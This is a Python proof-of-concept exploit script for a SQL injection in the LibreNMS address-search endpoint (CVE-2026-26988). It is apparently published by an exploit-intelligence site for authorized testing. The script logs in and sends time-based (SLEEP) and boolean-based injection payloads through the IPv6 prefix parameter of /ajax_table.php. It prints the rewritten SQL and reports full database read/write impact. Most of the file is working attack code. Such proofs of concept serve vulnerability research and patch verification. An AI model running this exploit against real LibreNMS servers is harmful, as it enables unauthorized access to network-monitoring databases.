#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : LibreNMS <= 25.12.0 SQL Injection via Address Search
# CVE            : CVE-2026-26988
# Vendor         : librenms
# Product        : LibreNMS
# Affected       : <= 25.12.0 (through 26.1.1)
# Type           : CWE-89 - SQL Injection
# CVSS           : 9.1 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2026-26988: LibreNMS <= 25.12.0 SQL Injection in ajax_table.php

Demonstrates blind SQL injection via the IPv6 address search endpoint.
The 'address' POST parameter is split on '/' and the prefix portion
is concatenated directly into a SQL WHERE clause without parameterization.

Injection point: includes/html/table/address-search.inc.php line 52:
    $sql .= " AND ipv6_prefixlen = '$prefix'";

This PoC authenticates to LibreNMS, then demonstrates:
  1. Time-based blind SQLi (SLEEP) - confirms injection via response delay
  2. Boolean-based blind SQLi - confirms injection via differential responses

Usage:
    python3 poc.py [host] [port] [username] [password]

Defaults:
    host=172.19.0.4, port=8000, username=admin, password=Cvelab2026!sqli
"""

import sys
import os
import time
import json

# Add script directory to path for shared module import
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from librenms_session import authenticate


# --- Configuration ---

DEFAULT_HOST = "172.19.0.4"
DEFAULT_PORT = 8000
DEFAULT_USER = "admin"
DEFAULT_PASS = "Cvelab2026!sqli"

SLEEP_SECONDS = 5          # SLEEP duration for time-based test
DELAY_THRESHOLD = 4.0      # Minimum response time to confirm SQLi (seconds)


# --- Injection Helpers ---

def send_sqli_request(session, search_type, address_payload):
    """
    Send a POST request to ajax_table.php with the given injection payload.
    Returns: (status_code, response_body, elapsed_seconds)
    """
    return session.post("/ajax_table.php", {
        "id": "address-search",
        "search_type": search_type,
        "address": address_payload,
        "current": "1",
        "rowCount": "10",
    })


# --- Test 1: Baseline ---

def test_baseline(session):
    """Send a normal (non-malicious) request to establish baseline timing."""
    print("\n" + "=" * 70)
    print("TEST 1: BASELINE REQUEST (no injection)")
    print("=" * 70)
    print("[*] Sending normal IPv6 address search with prefix=64")
    print("    Payload: address=2001:db8::1/64")

    status, body, elapsed = send_sqli_request(session, "ipv6", "2001:db8::1/64")

    print(f"    Status:  {status}")
    print(f"    Time:    {elapsed:.3f}s")
    print(f"    Body:    {body[:200]}")

    try:
        data = json.loads(body)
        print(f"    Total:   {data.get('total', '?')} rows")
    except (json.JSONDecodeError, ValueError):
        pass

    return elapsed


# --- Test 2: Time-based Blind SQLi ---

def test_time_based(session, sleep_seconds=SLEEP_SECONDS):
    """
    Time-based blind SQL injection via SLEEP().

    Injects: 1' OR SLEEP(N)-- -
    The prefix portion after '/' breaks out of the SQL string literal
    and executes SLEEP(N). A response delay of ~N seconds confirms SQLi.
    """
    print("\n" + "=" * 70)
    print(f"TEST 2: TIME-BASED BLIND SQL INJECTION (SLEEP({sleep_seconds}))")
    print("=" * 70)

    payload = f"::1/1' OR SLEEP({sleep_seconds})-- -"
    print(f"[*] Injecting time-based payload via IPv6 prefix")
    print(f"    Full address param: {payload}")
    print(f"    SQL becomes: ... AND ipv6_prefixlen = '1' OR SLEEP({sleep_seconds})-- -'")
    print(f"    Expected delay: ~{sleep_seconds}+ seconds")

    status, body, elapsed = send_sqli_request(session, "ipv6", payload)

    print(f"\n    Status:  {status}")
    print(f"    Time:    {elapsed:.3f}s")
    print(f"    Body:    {body[:200]}")

    if elapsed >= DELAY_THRESHOLD:
        print(f"\n[+] VULNERABLE! Response took {elapsed:.2f}s (threshold: {DELAY_THRESHOLD}s)")
        print(f"    The SLEEP({sleep_seconds}) payload executed successfully.")
        return True
    else:
        print(f"\n[-] Response was fast ({elapsed:.2f}s) - injection may not have worked")
        return False


# --- Test 3: Boolean-based Blind SQLi ---

def test_boolean_based(session):
    """
    Boolean-based blind SQL injection.
    Sends TRUE condition (OR 1=1) and FALSE condition (AND 1=2)
    to check for differential responses.
    """
    print("\n" + "=" * 70)
    print("TEST 3: BOOLEAN-BASED BLIND SQL INJECTION")
    print("=" * 70)

    true_payload = "::1/1' OR 1=1-- -"
    print(f"[*] Sending TRUE condition: {true_payload}")
    print(f"    SQL becomes: ... AND ipv6_prefixlen = '1' OR 1=1-- -'")

    status_t, body_t, elapsed_t = send_sqli_request(session, "ipv6", true_payload)
    print(f"    Status: {status_t} | Time: {elapsed_t:.3f}s")

    total_true = -1
    try:
        data = json.loads(body_t)
        total_true = data.get("total", -1)
        rows_true = len(data.get("rows", []))
        print(f"    Total:  {total_true} | Rows returned: {rows_true}")
    except (json.JSONDecodeError, ValueError):
        print(f"    Response (not JSON): {body_t[:200]}")

    false_payload = "::1/1' AND 1=2-- -"
    print(f"\n[*] Sending FALSE condition: {false_payload}")
    print(f"    SQL becomes: ... AND ipv6_prefixlen = '1' AND 1=2-- -'")

    status_f, body_f, elapsed_f = send_sqli_request(session, "ipv6", false_payload)
    print(f"    Status: {status_f} | Time: {elapsed_f:.3f}s")

    total_false = -1
    try:
        data = json.loads(body_f)
        total_false = data.get("total", -1)
        rows_false = len(data.get("rows", []))
        print(f"    Total:  {total_false} | Rows returned: {rows_false}")
    except (json.JSONDecodeError, ValueError):
        print(f"    Response (not JSON): {body_f[:200]}")

    if total_true != total_false and total_true >= 0 and total_false >= 0:
        print(f"\n[+] VULNERABLE! Boolean-based blind SQLi confirmed.")
        print(f"    TRUE condition returned total={total_true}")
        print(f"    FALSE condition returned total={total_false}")
        return True
    elif body_t != body_f:
        print(f"\n[+] VULNERABLE! Responses differ (boolean-based blind confirmed)")
        return True
    else:
        print(f"\n[-] Responses are identical - boolean test inconclusive")
        return False


# --- Main ---

def exploit(host, port, username, password):
    """Run the full PoC against the target."""
    base_url = f"http://{host}:{port}"

    print("=" * 70)
    print("  CVE-2026-26988: LibreNMS <= 25.12.0 SQL Injection PoC")
    print("  Endpoint: /ajax_table.php (address-search, IPv6 prefix)")
    print(f"  Target:   {base_url}")
    print("=" * 70)

    print("\n[*] Phase 1: Authentication")
    session = authenticate(host, port, username, password)
    if session is None:
        print("[-] FAILED: Could not authenticate. Aborting.")
        return False

    baseline_time = test_baseline(session)
    time_result = test_time_based(session)
    boolean_result = test_boolean_based(session)

    print("\n" + "=" * 70)
    print("RESULTS SUMMARY")
    print("=" * 70)
    print(f"  Baseline response time:  {baseline_time:.3f}s")
    print(f"  Time-based SQLi:         {'CONFIRMED' if time_result else 'FAILED'}")
    print(f"  Boolean-based SQLi:      {'CONFIRMED' if boolean_result else 'FAILED'}")

    if time_result or boolean_result:
        print("\n[+] CVE-2026-26988 CONFIRMED - SQL injection is exploitable!")
        print("    Attack vector: POST /ajax_table.php")
        print("    Parameter:     address (prefix after '/')")
        print("    Impact:        Full database read/write access")
        return True
    else:
        print("\n[-] Could not confirm the vulnerability")
        return False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    username = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_USER
    password = sys.argv[4] if len(sys.argv) > 4 else DEFAULT_PASS

    success = exploit(host, port, username, password)
    sys.exit(0 if success else 1)
